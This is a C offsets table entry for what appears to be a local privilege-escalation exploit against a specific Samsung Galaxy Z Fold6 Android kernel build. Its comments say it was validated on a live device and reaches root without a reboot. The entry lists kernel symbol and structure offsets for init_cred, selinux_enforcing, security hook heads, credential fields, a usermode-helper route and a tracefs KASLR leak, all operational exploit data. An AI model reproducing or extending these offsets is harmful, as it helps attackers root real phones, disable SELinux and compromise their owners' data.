/* Validated target for Samsung SM-F956U1 / F956U1UES4DZG3.
 *
 * Extracted from the exact AP boot.img and xbl_config.elf on 2026-09-22 with
 * tools/extract_target.py and LLVM 22.1.8, then validated on the live device on
 * 2026-09-23: the app-driven run reaches KernelSU root without rebooting the
 * phone.  Keep tracefs_leak enabled so a future run aborts if the leak metadata
 * does not match instead of guessing a KASLR slide.
 */

OFFSETS_ENTRY(
    "6.1.145-android14-11-33418572-abF956USQS4DZG3",
    STRUCT_OFFSETS_6_1,
    .waiter_compact = 1,
    .tracefs_leak = 1,
    .tracefs_event_id = 106,
    /* worker_thread is at 0xDB100; the known sched_blocked_reason caller is
     * worker_thread + 0xA0 on this image and the existing Fold6 target. */
    .tracefs_caller_off = 0xdb1a0,
    .umh_root = 1,
    .sync_route = 1,
    .off_call_usermodehelper_exec_work = 0x000d39cc,
    /* kallsyms: system_unbound_wq = 0xffffffc00a23ae60. */
    .off_system_unbound_wq = 0x0223ae60,
    .kimage_text_base = 0xffffffc008000000,
    /* BTF sizeof(mm_struct)=0x3c0; SLUB rounds this cache to a 0x400
     * object stride.  KernelSnitch must search the allocation stride. */
    .mm_struct_sz = 0x400,
    .page_slab_cache = 0x18,
    .kernel_phys_load = 0xa8000000,
    .pselect_waiter_shift = 1,
    .fops_ioctl = 0x50,
    .fops_compat_ioctl = 0x58,
    .fops_mmap = 0x60,
    .fops_open = 0x70,
    .fops_release = 0x80,
    .fops_splice_read = 0xc8,
    .fops_show_fdinfo = 0xe0,
    .cred_uid = 0x4,
    .cred_securebits = 0x24,
    .cred_caps = 0x28,
    .cred_security = 0x78,
    .off_init_task = 0x0224f8c0,
    .off_init_cred = 0x017af018,
    .off_root_task_group = 0x0244cd80,
    .off_selinux_enforcing = 0x02521588,
    .off_selinux_blob_sizes = 0x0176d2c8,
    .off_security_hook_heads = 0x0176cbb8,
    .off_kmalloc_caches = 0x0176c6f8,
    .off_anon_pipe_buf_ops = 0x01219d90,
    .off_slide_nfulnl_logger = 0x02242a20,
    /* random_table + 0x108 points at the boot-id data slot; the sysctl
     * table's data pointer is the separate 0x026046e8 symbol. */
    .off_slide_boot_id = 0x023762f0,
    .off_slide_sysctl_bootid = 0x026046e8,
    .off_configfs_read_iter = 0x004712a4,
    .off_configfs_bin_write_iter = 0x004717d4,
    .off_copy_splice_read = 0x003ef340,
    .off_noop_llseek = 0x003a14e4,
    .off_slide_loggers_0_1 = 0x02242970,
    .off_ashmem_misc_fops = 0x023bb5b0,
    .off_ashmem_fops = 0x013d1140,
    .off_ashmem_ioctl = 0x00d3a314,
    .off_ashmem_compat_ioctl = 0x00d3ac4c,
    .off_ashmem_mmap = 0x00d3aca4,
    .off_ashmem_open = 0x00d3aed0,
    .off_ashmem_release = 0x00d3af58,
    .off_ashmem_show_fdinfo = 0x00d3b078,
),

/* BTF reference (runtime uses the fields above): */
/* #define STRUCT_PAGE_SIZE 0x40 */
/* #define STRUCT_PAGE_COMPOUND_HEAD 0x8 */
/* #define STRUCT_PAGE_TYPE 0x30 */
/* #define STRUCT_SLAB_CACHE 0x18 */
/* #define STRUCT_MM_STRUCT 0x3C0 */
